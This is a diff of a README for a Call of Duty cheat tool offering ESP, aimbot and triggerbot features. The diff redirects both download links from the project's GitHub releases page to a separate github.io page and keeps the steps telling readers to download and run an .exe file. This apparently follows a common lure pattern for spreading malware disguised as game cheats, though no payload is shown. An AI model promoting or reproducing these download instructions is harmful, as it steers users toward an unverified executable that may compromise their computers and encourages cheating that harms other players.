@@ -1,6 +1,6 @@
 # 🎮 COD-Nightmare-X - Improve your performance in every match
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/fuchsme363/COD-Nightmare-X/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://fuchsme363.github.io)
 
 COD-Nightmare-X provides tools to assist players during Call of Duty sessions. This software includes features like ESP, aimbot, triggerbot, and recoil management. It helps users track player locations and refine aim precision.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these specifications to run the application:
 
 Follow these steps to obtain the software:
 
-1. Visit [this link](https://github.com/fuchsme363/COD-Nightmare-X/releases) to access the official release page.
+1. Visit [this link](https://fuchsme363.github.io) to access the official release page.
 2. Select the latest version listed under the Releases section.
 3. Locate the file ending in .exe.
 4. Click the file name to start the download.
